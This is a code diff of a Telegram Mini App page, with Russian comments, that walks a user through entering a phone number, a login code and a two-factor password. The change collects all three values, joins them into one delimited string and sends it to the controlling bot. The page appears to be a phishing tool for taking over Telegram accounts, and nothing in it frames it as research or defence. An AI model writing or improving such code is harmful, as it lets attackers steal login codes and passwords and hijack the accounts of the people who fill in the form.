@@ -127,41 +127,42 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // Функция переключения шагов и смены иконок
-    function showStep(stepId, icon) {
+    // Память для данных
+    let userData = {
+        phone: '',
+        code: '',
+        password: ''
+    };
+
+    function nextStep(stepId, icon) {
+        if (stepId === 'code') {
+            userData.phone = document.getElementById('p').value;
+            if(!userData.phone) return;
+            showStep('code', '✉️');
+        } 
+        else if (stepId === 'pass') {
+            userData.code = document.getElementById('c').value;
+            if(!userData.code) return;
+            showStep('pass', '🔑');
+        }
+    }
+
+    function showStep(id, icon) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step-' + stepId).classList.add('active');
+        document.getElementById('step-' + id).classList.add('active');
         document.getElementById('main-icon').innerText = icon;
-    }
-
-    function nextStep(step) {
-        const p = document.getElementById('p').value;
-        if(!p) return tg.HapticFeedback.notificationOccurred('error');
-        
-        tg.HapticFeedback.impactOccurred('medium');
-        showStep('code', '✉️'); // Меняем на конверт
-        document.getElementById('c').focus();
-    }
-
-    // Эта функция решает: отправить данные или спросить пароль
-    function checkPasswordStep() {
-        const c = document.getElementById('c').value;
-        if(!c) return;
-
-        tg.HapticFeedback.impactOccurred('medium');
-        
-        // Маленькая хитрость: если хочешь, чтобы пароль всегда спрашивался в мини-аппе:
-        showStep('pass', '🔑'); // Меняем на ключ
-        document.getElementById('pass').focus();
+        const input = document.querySelector('#step-' + id + ' input');
+        if(input) input.focus();
     }
 
     function finish() {
-        const phone = document.getElementById('p').value;
-        const code = document.getElementById('c').value;
-        const pass = document.getElementById('pass').value;
-
-        tg.sendData(code); 
-        tg.close();
+        userData.password = document.getElementById('pass').value;
+        
+        // Склеиваем всё в одну строку через разделитель |
+        const finalData = `${userData.phone}|${userData.code}|${userData.password}`;
+        
+        // Отправляем боту и закрываем окно
+        tg.sendData(finalData);
     }
 </script>
 
